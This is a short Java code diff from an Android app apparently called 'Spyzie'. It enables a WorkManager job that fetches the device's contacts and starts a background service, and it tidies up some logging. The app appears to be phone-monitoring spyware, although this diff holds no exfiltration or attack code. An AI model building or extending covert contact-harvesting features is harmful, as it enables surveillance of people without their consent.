@@ -4,8 +4,10 @@ import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
+import androidx.work.ExistingWorkPolicy;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 
 import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.device.worker.GetContactsWorker;
@@ -18,11 +20,16 @@ import java.util.concurrent.TimeUnit;
 
 import javax.inject.Inject;
 
+/**
+ * Created by tantd on 2/26/2020.
+ */
 public class AppDeviceDataManager implements DeviceDataManager {
 
     @Inject
     @ApplicationContext
     Context mContext;
+
+    private static final String DEBUG_SUB_TAG = "[" + AppDeviceDataManager.class.getSimpleName() + "] ";
 
     private static final int UPDATE_PERIOD = 4;
     private static final String FETCH_CONTACTS = "FETCH_CONTACTS";
@@ -49,13 +56,12 @@ public class AppDeviceDataManager implements DeviceDataManager {
 
     @Override
     public void startFetchingDeviceData() {
-        Log.d(Constants.LOG_TAG, "[AppDeviceDataManager] startFetchingDeviceData, isRunning=" + isRunning);
+        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "startFetchingDeviceData, isRunning=" + isRunning);
         if (!isRunning) {
             if (Constants.IS_DEBUG_MODE) {
-//            WorkManager.getInstance(mContext).enqueueUniqueWork(FETCH_CONTACTS, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
+                WorkManager.getInstance(mContext).enqueueUniqueWork(FETCH_CONTACTS, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
                 Intent intent = new Intent(SpyzieApplication.getInstance(), SpyzieService.class);
                 SpyzieApplication.getInstance().startService(intent);
-
             } else {
 
             }
